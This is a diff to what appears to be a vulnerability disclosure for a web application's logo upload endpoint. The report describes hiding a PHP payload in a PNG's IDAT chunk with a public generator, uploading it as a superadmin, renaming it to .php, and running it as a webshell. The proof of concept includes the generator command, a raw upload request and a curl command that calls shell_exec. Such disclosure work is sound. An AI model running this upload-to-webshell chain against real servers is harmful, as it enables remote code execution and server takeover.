@@ -116,7 +116,7 @@ I tried several way to bypass the mime checking such as putting payload in comme
 
 ## Proof of Concept
 
-To generate the IDAT PHP payload we use
+Clone repo from [https://github.com/huntergregal/PNG-IDAT-Payload-Generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator). To generate the IDAT PHP payload we use
 
 ```
 python3 .\generate.py -m php -o test.png
@@ -139,10 +139,6 @@ Then use superadmin account to upload, change .png to .php
 POST /api/v1/company/upload-logo HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-X-Requested-With: XMLHttpRequest
 Authorization: undefined
 company: 1
 X-XSRF-TOKEN: eyJpdiI6IjlmTDJpdzRNUUFCNVlObXUvbDN4c2c9PSIsInZhbHVlIjoidjJCdVlXemtlQ0NHbzFmTC93dzNxZzVhd0IrOFlYd1d6aUxCZWFJWElTd3pDTEdoTlNUT1o1S2NRMWp5cWRhckJVejhiZVArRThPbGxzSGRsVTg5QkJBY1RKdDhnOEt6MkxadHM0MGRPNkErZVRnRkJaenVXZXVrMHVlSkZMVzciLCJtYWMiOiJmMmE2ZWRkNjE4YzZmYTE5NjY1ODgxYWEzNDhkOGJlNzA1MmIxYWQyYmI3MjM2YmRiNjc2NzBmMDE2NDY3NTVhIiwidGFnIjoiIn0=
@@ -169,7 +165,7 @@ false
 
 ```
 
-Attacker may then execute the PHP webshell by send request such as:
+Attacker may then execute the PHP webshell by sending request such as:
 
 ```
 curl -XPOST -d '1=uname -a' 'http://localhost/storage/1/test.php?0=shell_exec' --output o && cat o
